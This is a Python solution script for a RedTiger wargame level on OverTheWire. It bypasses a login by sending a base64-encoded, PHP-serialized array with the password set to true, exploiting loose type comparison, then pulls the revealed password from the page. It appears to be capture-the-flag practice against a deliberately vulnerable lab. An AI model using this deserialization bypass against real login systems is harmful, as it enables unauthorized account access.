#!/usr/bin/env python3
import tigers as tg
import base64
from phpserialize import serialize
import tiger_cookies


def main():
    """
    Target: Bypass the login. Login as TheMaster
    """
    url = "https://redtiger.labs.overthewire.org/level10.php"
    pass_r = 'The password for the hall of fame is: '
    user = 'TheMaster'
    level = 'level10login'
    method = 'post'
    inj_param = 'login'
    other_param = {'dologin': 'Login'}

    cooks = tiger_cookies.check_cookies(level)
    cook = dict(level10login=cooks[level])

    array = serialize(
        {'username': 'TheMaster', 'password': True, })

    # Authorization
    payload = base64.b64encode(array)
    print(payload)
    p = tg.SqlInjection(url, cook, method, inj_param, payload,
                        check_clear=pass_r, other_param=other_param)
    response = p.my_request(print_param=False)
    print(response)

    # Еxtracting data from html
    p.extract_pass(response)


if __name__ == '__main__':
    main()
